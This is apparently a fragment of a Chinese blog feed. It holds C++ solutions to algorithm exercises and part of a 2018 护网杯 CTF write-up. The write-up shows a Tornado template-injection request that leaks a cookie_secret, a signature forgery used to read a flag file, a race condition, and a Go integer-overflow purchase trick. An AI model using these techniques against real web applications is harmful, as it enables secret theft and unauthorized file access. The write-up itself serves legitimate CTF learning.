class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> s,e;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a,node b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span>  a.e &lt; b.e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n ,m;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">node a[<span class="number">105</span>],b[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; n;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i].s&gt;&gt;a[i].e;</span><br><span class="line">&#125;</span><br><span class="line">sort(a,a+n,cmp);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j&lt; m;j++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;b[j].s&gt;&gt;b[j].e;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span> ;k &lt; n;k ++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[k].s &gt;= b[j].s)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[k].e &lt;= b[j].e)&#123;</span><br><span class="line">sum++;</span><br><span class="line">b[j].s = a[k].e;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="法师康的工人"><a href="#法师康的工人" class="headerlink" title="法师康的工人"></a>法师康的工人</h3><h4 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h4><p>三个法师康的工人每天早上6点到工厂开始到三条产品生产线上组装桔子手机。第一个工人在200时刻开始（从6点开始计时，以秒作为单位）在生产线上开始生产，一直到1000时刻。第二个工人，在700时刻开始，在1100时刻结束。第三个工人从1500时刻工作到2100时刻。期间最长至少有一个工人在生产线上工作的连续时间为900秒（从200时刻到1100时刻），而最长的无人生产的连续时间（从生产开始到生产结束）为400时刻（1100时刻到1500时刻）。</p><p>你的任务是用一个程序衡量N个工人在N条产品线上的工作时间列表（1≤N≤5000，以秒为单位）。</p><p>最长的至少有一个工人在工作的时间段</p><p>最长的无人工作的时间段（从有人工作开始计）</p><h5 id="输入-14"><a href="#输入-14" class="headerlink" title="输入"></a>输入</h5><p>输入第1行为一个整数N，第2-N+1行每行包括两个均小于1000000的非负整数数据，表示其中一个工人的生产开始时间与结束时间。</p><h5 id="输出-14"><a href="#输出-14" class="headerlink" title="输出"></a>输出</h5><p>输出为一行，用空格分隔开两个我们所求的数。</p><h5 id="样例输入-14"><a href="#样例输入-14" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">200 1000</span><br><span class="line">700 1100</span><br><span class="line">1500 2100</span><br></pre></td></tr></table></figure><h5 id="样例输出-14"><a href="#样例输出-14" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">900 400</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">worker</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> s,e;</span><br><span class="line">&#125;w[<span class="number">105</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(worker a, worker b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a.s == b.s) <span class="keyword">return</span> a.e&lt;b.e;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> a.s &lt; b.s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N ;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; N ; i++) <span class="built_in">cin</span>&gt;&gt;w[i].s&gt;&gt;w[i].e;</span><br><span class="line"><span class="keyword">int</span> sus = w[<span class="number">0</span>].e -w[<span class="number">0</span>].s,gap = <span class="number">0</span>,t1 = w[<span class="number">0</span>].s,t2 = w[<span class="number">0</span>].e;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; N ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(w[i].s &gt; t2)&#123;</span><br><span class="line">gap = max(gap,w[i].s-t2);</span><br><span class="line">t1 = w[i].s;</span><br><span class="line">&#125;</span><br><span class="line">t2 = max(t2,w[i].e);</span><br><span class="line">sus = max(sus,t2-t1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sus&lt;&lt;<span class="string">" "</span>&lt;&lt;gap&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><h4 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一只含有小写字母的字符串；输出其哈夫曼编码的长度</p><h5 id="输入-15"><a href="#输入-15" class="headerlink" title="输入"></a>输入</h5><p>第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500.</p><h5 id="输出-15"><a href="#输出-15" class="headerlink" title="输出"></a>输出</h5><p>对于每个字符串，输出其哈夫曼编码长度</p><h5 id="样例输入-15"><a href="#样例输入-15" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">hrvsh</span><br><span class="line">lcxeasexdphiopd</span><br><span class="line">mntflolfbtbpplahqolqykrqdnwdoq</span><br></pre></td></tr></table></figure><h5 id="样例输出-15"><a href="#样例输出-15" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">51</span><br><span class="line">115</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> b[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1005</span>];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span>&#123;</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x&gt;y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*会用优先队列事半功倍*/</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span> , <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;,cmp&gt; q;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[i]) q.push(b[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(q.size()&gt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> a  = q.top();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="keyword">int</span> c = q.top();</span><br><span class="line">q.pop();</span><br><span class="line">sum = a+c;</span><br><span class="line">q.push(sum);</span><br><span class="line"></span><br><span class="line">ans += sum ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> T;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line"><span class="keyword">while</span>(T--)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line"><span class="keyword">int</span> lens =<span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="keyword">while</span>(!q.empty()) q.pop();</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="keyword">sizeof</span>(b));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; lens ; i++)&#123;</span><br><span class="line">b[<span class="keyword">int</span>(s[i]-<span class="string">'a'</span>)]++;</span><br><span class="line">&#125; </span><br><span class="line">solve();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="活动安排-考试考了类似的"><a href="#活动安排-考试考了类似的" class="headerlink" title="活动安排(考试考了类似的)"></a>活动安排(考试考了类似的)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> begin,end;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(work a,work b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.end &lt; b.end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">work w[<span class="number">50</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;w[i].begin&gt;&gt;w[i].end;</span><br><span class="line">&#125;</span><br><span class="line">sort(w,w+n,cmp);</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>; i&lt; n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(w[i].begin &gt;= w[j].end)&#123;</span><br><span class="line">ans++;</span><br><span class="line">j = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近要上机考试，因此还是对以前做过的题目做一个复习回顾，自己重新手写一遍，纯属回顾，代码风格不好请海涵，考完试以后我把考了的点都标记了一下方便以后学弟学妹们复习了
    
    </summary>
    
      <category term="算法" scheme="0verwatch.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="algorithm" scheme="0verwatch.top/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>护网杯部分题目题解</title>
    <link href="0verwatch.top/huwang-game.html"/>
    <id>0verwatch.top/huwang-game.html</id>
    <published>2018-10-13T16:27:10.000Z</published>
    <updated>2018-10-14T01:52:10.852Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>护网杯的这次比赛还是很有收获的，至少在web方面我认为是这样<a id="more"></a>的。。。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="迟来的签到"><a href="#迟来的签到" class="headerlink" title="迟来的签到"></a>迟来的签到</h4><p><code>AAoHAR1UIFBSJFFQU1AjUVEjVidWUVJVJVZUIyUnI18jVFNXVRs=</code><br>题目说要异或，那就直接爆破异或就好<br>写个小脚本就可以得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">a = <span class="string">"AAoHAR1UIFBSJFFQU1AjUVEjVidWUVJVJVZUIyUnI18jVFNXVRs="</span></span><br><span class="line">a = base64.b64decode(a)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">s  = s+chr(i^ord(j))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="fez"><a href="#fez" class="headerlink" title="fez"></a>fez</h4><p>这个题目是我队友做的。。。。赛后才学习的，看来密码学以后还得认真上课。。。。<br>Fez.log给出三条数据，第一条为test，第二条为test与k加密后的数据，第三条为flag与k加密后的数据<br>fez.py为加密算法，通过分析算法</p><p><img src="https://s1.ax1x.com/2018/10/13/iUC4te.jpg" alt="iUC4te.jpg"></p><p>即a，b每一位进行异或运算<br><img src="https://s1.ax1x.com/2018/10/13/iUCHXt.jpg" alt="iUCHXt.jpg"><br>Round函数将M左右部分互换，并对右部分进行异或运算得 <code>R^L^k[i]</code><br>Fez函数即将k数组每个元素与m进行<code>round</code>运算<br>可得m为字符串分为<code>m[0:27]</code>,<code>m[27:54]</code>两部分通过一步一步推算<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m:  L + R</span><br><span class="line">R + a    a: L^R^k0</span><br><span class="line">a + b    b: L^k0^k1</span><br><span class="line">b +    c    c: R^k0^k1    </span><br><span class="line">c + d    d: L^k0^k2^k3</span><br><span class="line">d + e    e: L^k0^k1^k3^k4</span><br><span class="line">e + f    f: R^k1^k2^k4^k5</span><br><span class="line">f + g    g: L^R^k0^k1^k3^k5^k6</span><br></pre></td></tr></table></figure></p><p>根据异或运算得特性<br>已知test(也就是L，R),fez(test,k)(也就是f,g)，即可通过test与fez(test,k) 进行异或运算可得出 <code>k0^k1^k3^k5^k6</code> ，<code>k1^k2^k4^k5</code><br>从而还原flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"> </span><br><span class="line">test = <span class="string">'50543fc0bca1bb4f21300f0074990f846a8009febded0b2198324c1b31d2e2563c908dcabbc461f194e70527e03a807e9a478f9a56f7'</span></span><br><span class="line">test = binascii.a2b_hex(test)</span><br><span class="line">test_k = <span class="string">'66bbd551d9847c1a10755987b43f8b214ee9c6ec2949eef01321b0bc42cffce6bdbd604924e5cbd99b7c56cf461561186921087fa1e9'</span></span><br><span class="line">test_k = binascii.a2b_hex(test_k)</span><br><span class="line">m_k = <span class="string">'44fc6f82bdd0dff9aca3e0e82cbb9d6683516524c245494b89c272a83d2b88452ec0bfa0a73ffb42e304fe3748896111b9bdf4171903'</span></span><br><span class="line">m_k = binascii.a2b_hex(m_k)</span><br><span class="line"> </span><br><span class="line">l = test[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r = test[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l1 = test_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r1 = test_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l2 = m_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r2 = m_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"> </span><br><span class="line">c = xor(xor(l,r),r1)</span><br><span class="line">Lr = xor(c,r2)</span><br><span class="line">d = xor(r,l1)</span><br><span class="line">R = xor(d,l2)</span><br><span class="line">L = xor(Lr,R)</span><br><span class="line">m = L+R  </span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure></p><p><a href="https://imgchr.com/i/iUP9cn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/13/iUP9cn.md.png" alt="iUP9cn.md.png"></a></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>这里的web题目是我趁着题目还没关的时候赶紧复现的（不会做后面弄懂也是学习的方法呀23333），感谢一叶飘零学长的帮助哇。。。。</p><h4 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h4><p>这个题目上来每个选项url就很可疑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.95.5:31792/file?filename=Orz.txt&amp;signature=d227ce6c7cea5a9cd7f1721e0baace7d</span><br><span class="line"></span><br><span class="line">Orz.txt</span><br><span class="line">render() </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=hint.txt&amp;signature=c7b8660e245f1360c378db1074a2a4c7</span><br><span class="line"></span><br><span class="line">hint.txt</span><br><span class="line">md5(cookie_secret + md5(filename)) </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=flag.txt&amp;signature=d24b2dc1952a495057af1a898c55931b</span><br><span class="line"></span><br><span class="line">flag.txt</span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure></p><p>很明显是去读文件<code>/fllllllllllag</code> ，并且要带上签名，一开始我做这个题的时候还以为强行爆破一波secret。。。还一度认为是Hash长度拓展攻击。。。。尴尬</p><p>关键点在于<code>cookie_secret</code></p><p>当我们随便输入东西的时候会出现一个报错页面<br><a href="https://imgchr.com/i/iUPn39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPn39.md.png" alt="iUPn39.md.png"></a></p><p>这个页面过滤了很多东西，并且返回Orz</p><p>输入</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p><a href="https://imgchr.com/i/iUPucR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPucR.md.png" alt="iUPucR.md.png"></a></p><p>这里的话飘零大佬说可以进行模板注入，并且只能读一个变量<br>接下来的思路才是骚，直接阅读tornado的源码<br><code>https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py</code></p><p>在<code>handler.settings</code> 里面存在<code>cookie_secret</code>这东西</p><p>读取一下</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p>注意一下，这里的两个大括号{}是起到渲染模板的作用。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Whoops, looks like somethings went wrong . </span><br><span class="line">&#123;&apos;login_url&apos;: &apos;/login&apos;, &apos;template_path&apos;: &apos;templates&apos;, &apos;xsrf_cookies&apos;: True, &apos;cookie_secret&apos;: &apos;B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb&apos;, &apos;debug&apos;: False, &apos;file_path&apos;: &apos;/www/static/files&apos;, &apos;static_path&apos;: &apos;static&apos;&#125;</span><br></pre></td></tr></table></figure><p>可以把里面的内容给读出来，以后还是得对python的MVC架构学习一下才行。。</p><p>立即构造签名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">'B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb'</span>.md5(<span class="string">'/fllllllllllag'</span>)) ;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>http://49.4.95.5:31792/file?filename=/fllllllllllag&amp;signature=3e9f949b7c37c999287eb096f576be00</code></p><p>得到flag<br><a href="https://imgchr.com/i/iUPKj1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPKj1.md.png" alt="iUPKj1.md.png"></a></p><h4 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h4><p>这个题目一开始我一直以为是前端的<code>ajax</code>的操作问题，直到看了飘零大哥的wp才知道有两种思路，一种是条件竞争，但条件竞争好像还是有上限的，开个多线程跑一下，这也是为了后面的怪异的<code>9999999</code>做铺垫,因为你没有5个以上的大辣条是换不了辣条之王的。<br><img src="https://s1.ax1x.com/2018/10/14/iUP1HK.png" alt="iUP1HK.png"><br>然后就会发现辣条数目几变成7个<br><img src="https://s1.ax1x.com/2018/10/14/iUP8AO.png" alt="iUP8AO.png"></p><p>下面才是重点，因为这里是用的是Go语言，很可能存在整数溢出，可以参考一下这篇文章<br><a href="http://www.it1352.com/808569.html" target="_blank" rel="noopener">http://www.it1352.com/808569.html</a></p><p>go语言整数溢出为<code>18446744073709551615</code>，然后可以计算<code>number=(18446744073709551615/5)+1=3689348814741910324</code>，然后我们可以直接溢出获得flag<br>下面这篇博客对于溢出过大有更深的理解:<br><a 